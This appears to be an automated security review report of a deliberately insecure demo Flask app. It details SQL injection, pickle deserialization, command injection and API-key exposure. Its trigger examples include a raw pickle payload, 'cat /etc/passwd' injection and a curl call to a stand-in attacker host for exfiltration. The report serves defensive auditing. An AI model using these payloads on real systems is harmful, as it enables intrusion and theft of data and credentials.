Archival search returned **sqli-search** (score 0.83) matching `demo/insecure/app.py`. Temporal graph confirmed all four TP signatures co-located in this file with effective scores 0.79–0.83. All four match known true-positive patterns with path-glob `demo/insecure/app.py` — high confidence.

---

**Verdict:** REQUEST CHANGES  
**Score:** 0 / 100

### Summary
This file contains four **critical** vulnerabilities, each independently capable of full compromise: SQL injection, command injection (RCE), unsafe pickle deserialization (RCE), and unauthenticated secret exposure. The file is explicitly marked "DO NOT deploy" and appears to be a demo/training target — it should never reach production in this state.

### Blocking
All four findings below are independently blocking. Each provides an attacker a path to data exfiltration, remote code execution, or credential theft.

### Security audit
- **sql_injection** — `demo/insecure/app.py:15` — CWE-89 — CRITICAL
- **insecure_deserialization** — `demo/insecure/app.py:21` — CWE-502 — CRITICAL
- **command_injection** — `demo/insecure/app.py:27` — CWE-78 — CRITICAL
- **secret_exposure** — `demo/insecure/app.py:32` — CWE-200/CWE-798 — CRITICAL

### Key findings

**1. SQL Injection — `demo/insecure/app.py:15` (CWE-89, CRITICAL)**
- **Match:** `sqli-search` TP signature (effective_score=0.83, hits=3)
- **Trigger:** `GET /search?q=' OR 1=1 --`
- **Evidence:** `cur.execute(f"SELECT * FROM items WHERE name = '{q}'")` interpolates unsanitized user input `q` from `request.args.get("q")` directly into SQL via f-string. No parameterized query, no escaping, no input validation.
- **Impact:** Full database read/write. Attacker can exfiltrate all rows, modify data, or drop tables via stacked queries.

**2. Insecure Deserialization — `demo/insecure/app.py:21` (CWE-502, CRITICAL)**
- **Match:** `pickle-load` TP signature (effective_score=0.79, hits=3)
- **Trigger:** `POST /load` with a crafted pickle payload (e.g., `cos\nsystem\n(S'id'\ntR.`)
- **Evidence:** `pickle.loads(data)` directly deserializes untrusted bytes from `request.data` with no allowlist, no signature verification, no sandboxing.
- **Impact:** Arbitrary code execution on the server. Attacker gains shell access as the Flask process user.

**3. Command Injection — `demo/insecure/app.py:27` (CWE-78, CRITICAL)**
- **Match:** `cmdi-run` TP signature (effective_score=0.81, hits=3)
- **Trigger:** `GET /run?cmd=; cat /etc/passwd` or `GET /run?cmd=$(curl attacker.com/exfil)`
- **Evidence:** `subprocess.check_output(cmd, shell=True)` passes attacker-controlled `cmd` from `request.args.get("cmd")` directly to a shell with no sanitization, no allowlist, no `shlex.quote`.
- **Impact:** Arbitrary command execution. Full server compromise, lateral movement, data exfiltration.

**4. Secret Exposure — `demo/insecure/app.py:32` (CWE-200/CWE-798, CRITICAL)**
- **Match:** `secret-exposure` TP signature (effective_score=0.81, hits=3)
- **Trigger:** `GET /secret` — no authentication required.
- **Evidence:** `return {"key": os.environ.get("OPENROUTER_API_KEY", "missing")}` returns the API key from the environment to any caller. No auth check, no rate limiting, no IP restriction.
- **Impact:** Attacker obtains the OpenRouter API key and can make authenticated API calls, incurring costs and potentially accessing linked resources.

### Multi-lens checklist

| Lens | Status | Note |
|------|--------|------|
| Injection (SQL/CMD/LDAP) | **concern** | SQL injection at :15, command injection at :27 |
| AuthN / AuthZ bypass | **concern** | `/secret` endpoint has zero auth checks |
| Secrets / key material | **concern** | `OPENROUTER_API_KEY` exposed at :32 |
| XSS / output encoding | ok | JSON responses; no HTML rendering surface |
| CSRF / same-site | ok | No state-changing GETs; POST `/load` has no CSRF token but RCE via pickle dominates |
| SSRF / outbound calls | n/a | No outbound HTTP calls in this file |
| Path traversal | n/a | No file paths derived from user input |
| Unsafe deserialize / pickle | **concern** | `pickle.loads()` on untrusted input at :21 |
| Crypto misuse | n/a | No crypto operations |
| Supply-chain / deps | ok | Standard library + Flask — no suspicious imports |
| Fail-open defaults | ok | No conditional auth gates to fail open |

### Tests & risk
- **No tests present** for any of the four vulnerable endpoints. Since this file is an intentional demo, absence of tests is likely by design, but for any non-demo use, negative tests for each vulnerability class would be required.

### What I checked
- Read full file: `demo/insecure/app.py` (32 lines)
- Memory archival search: `auth OR sql OR pickle OR secret` — 8 hits, top hit `sqli-search` matched path-glob `demo/insecure/app.py` with score 0.83
- Temporal graph: `--path demo/insecure/app.py --hops 2` — all four TP seeds (`sqli-search`, `pickle-load`, `cmdi-run`, `secret-exposure`) confirmed co-located on this path
- Diff context: N/A (full-file review, not a PR diff)
- Cross-referenced F70 TP signatures in prompt against file evidence — all four confirmed with path:line evidence

— **Torii Gate**
